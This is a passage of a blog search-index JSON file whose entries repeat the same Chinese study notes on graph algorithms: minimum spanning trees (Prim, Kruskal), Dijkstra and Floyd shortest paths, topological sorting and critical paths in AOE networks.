如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#普里姆prim算法"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#克鲁斯卡尔kruskal算法"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#两种算法比较"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#最短路径"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#单源最短路径dijkstra迪杰斯特拉算法"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#所有顶点间的最短路径floyd弗洛伊德算法"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 